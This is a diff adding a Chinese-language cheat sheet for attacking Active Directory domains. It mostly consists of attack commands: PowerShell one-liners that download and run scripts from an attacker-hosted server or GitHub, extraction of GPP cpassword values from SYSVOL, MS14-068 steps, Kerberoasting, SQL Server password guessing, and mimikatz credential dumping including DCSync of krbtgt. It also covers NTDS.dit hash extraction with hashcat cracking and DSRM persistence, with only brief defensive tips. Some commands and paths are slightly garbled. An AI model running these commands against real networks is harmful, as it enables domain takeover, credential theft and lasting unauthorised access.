@@ -1,0 +1,159 @@
+想知道那一台是域控，知道自己内网的DNS就可以了，一般域控安装都有安装DNS有些不止一台，其次是通过扫描开放端口为389的机器或者使用NLTEST命令查看。最后就是各种网络查看域控是那台主机
+nltest /DCLIST:域名
+nmap -n -sS -p 389 IP/24
+https://github.com/cheetz/PowerTools 用于域信息收集的项目
+使用方法：
+1.先将这个项目下载到vps或本地通过ngrok映射到公网
+2.打开powershell执行：IEX (New.ObjectNet.WebClient).DownloadString('http://IP地址/powerview.ps1');Get-HostIP
+注意：每个脚本都有详细的使用信息注意看README.md
+
+SYSVOL
+SYSVOL是指存储公共服务器副本的共享文件夹，它们在域中所有的域控制器之间复制.Sysvol文件夹是安装AD时创建的，它用来存放GPO，脚本等信息。同时，存放Sysvol文件文件夹中的信息，会复制到域中所有DC上。
+
+域服务器一般都会共享这个文件夹，或者搜索当前机器下的XML文件将包含凭据：groups.xml，scheduledtasks.xml，services.xml中，datasources.xml
+
+映射驱动（Drives.xml）
+数据源（DataSources.xml）
+打印机配置（Printers.xml）
+创建/更新服务（services.xml中）
+计划任务（ScheduledTasks.xml）
+
+由于经过身份验证的用户（任何域用户或受信任域中的用户）具有对SYSVOL的读取权限
+
+\192.168.50.205sysvolpentest.comPolicies{84017B64-2662-4BA3-A06C-FB953CCBE92D}UserPreferencesGroups.xml
+经过AES-256位加密
+
+
+
+cpassword="fUCMHAw9I2PdYRZEBMS54IvtPHX3ni44qRkWtfBtxoA"
+可以使用AES私钥解密GPP密码
+
+微软在MSDN上发布了AES加密密钥（共享密钥）
+https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx
+
+使用PowerShell的脚本解密
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+
+寻找SYSVOL里的密码和攻击GPP（组策略偏好
+注：当创建了一个域用户后，将其添加到验证组策略对象。在SYSVOL的xml文件会有用户的配置文件
+http://www.91ri.org/14909.html
+
+防SYSVOL更新配置文件：
+防：
+*在用于管理GPO的计算机上安装KB2962486，以防止将新凭据置于组策略首选项中。
+*设置每个人访问权限
+*不在组策略中使用域控密码
+*设置共享文件夹SYSVOL的访问权限
+*删除现有的GPP里包含密码的XML文件。
+
+MS14-068攻击
+需要条件：
+域用户及其口令
+域用户对应sid
+域控地址 Win7及以上系统
+Tips：
+1. 操作系统要求Win7及以上，这是因为XP不支持导入Ticket
+2. 攻击主机可使用其他域用户信息，比如可以在主机A上用域用户B的口令及sid攻击
+3. 将Python脚本转成exe即可在任意一台Windows主机使用
+注意事项：
+Tips：
+1. 如果不先清除内存中的Ticket直接导入，有可能会失败
+2. 连接域控要使用域控地址，不要用IP
+利用方法：https://www.cnblogs.com/backlion/p/6820744.html?utm_source=itdadao&utm_medium=referral
+
+MS14-068过程：
+1.请求没有PAC的Kerberos TGT认证票据作为标准用户，DC回复TGT
+2.生成一个伪造的PAC，没有密钥，所以生成的PAC使用域用户的密码数据用MD5算法而不是HMAC_MD5“签名”。
+3.作为TGS服务票据请求的一部分，使用伪造的PAC作为授权数据发送无PAC的TGT到DC。
+4.DC似乎被这个混淆了，所以它放弃了用户发送的不含PAC的TGT，创建一个新的TGT，并将伪造的PAC插入到它自己的授权数据中，并将这个TGT发送给用户。
+5.这个伪造PAC的TGT使得用户可以成为易受攻击的DC上的域管理员。
+
+防御：安装检查KB3011780的安装
+
+SPN扫描
+Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包
+SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内置帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。
+SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。
+powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSMSSQLServers'); Discover-PSMSSQLServers"
+
+扫描SQL Server脚本
+*地址：https://github.com/nullbind/Powershellery/tree/master/Stable-ish/MSSQL
+*用法：Import-Module .Get-SQLServerAccess.psm1或者放到VPS用下载并执行的方式来执行脚本
+*弱口令猜解：Get-SQLServerAccess -sqluser sa -sqlpass 123qwe!@#
+*寻找敏感数据：Get-SQLServerAccess -query "select name as 'Databases' from master..sysdatabases where HAS_DBACCESS(name) = 1"
+
+非扫描式的SQL Server发现
+
+
+
+https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning
+
+
+
+相关资料：
+SPN扫描
+https://adsecurity.org/?p=1508
+扫描SQLServer的脚本
+https://github.com/PyroTek3/PowerShell-AD-Recon
+Kerberos的黄金门票
+https://adsecurity.org/?p=1640
+域服务账号破解实践
+http://bobao.360.cn/learning/detail/3564.html
+Kerberos的认证原理
+http://blog.csdn.net/wulantian/article/details/42418231
+深刻理解windows安全认证机制ntlm＆Kerberos
+的Kerberos身份验证流程
+https://klionsec.github.io/2016/08/10/ntlm-kerberos/
+
+黄金票据看kerberos滥用
+白银票据看白银票据记录
+
+用mimkatz提取密码和hash
+提取AD的哈希
+lsadumo::lsa /inject exit
+转储LSASS内存
+sekurlsa::minidump c:\temp\lsass.dmp
+提取KRBTGT用户账户的密码数据
+privilege::debug lsadump::dcsync /domain:域名     user:krbtgt exit
+管理员用户帐户提取密码数据：
+Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator" exit
+
+
+
+
+从NTDS.DIT中提取哈希
+
+
+
+提取出来的文件通过ntdsdump是无法提取的通过esedbexport来恢复。
+
+
+
+安装：
+wget https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz`
+apt-get install autoconf automake autopoint libtool pkg-config
+./configure
+make
+make install
+ldconfig
+esedbexport -m tables ntds.dit
+大概需要（20-30分钟）
+
+
+最后生成在./ntds.dit.export/
+使用ntdsxtract提取域信息
+git clone https://github.com/csababarta/ntdsxtract.git
+python setup.py build && python setup.py install
+提取哈希:(这里需要将刚拷出来的三个文件中的系统复制到当前目录下）
+$ dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt
+这样提取出来之后已经是转换成hashcat可破解的格式
+hashcat -m 1000 ntout ./password.txt
+
+DSRM密码同步
+DSRM密码同步将域控权限持久化
+获取到域控权限后如何利用DSRM密码同步将域管权限持久化。
+Windows Server 2008需要安装KB961320补丁才能支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。
+KB961320
+https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni
+巧用DSRM密码同步将域控权限持久化
+http://drops.xmd5.com/static/drops/tips-9297.html
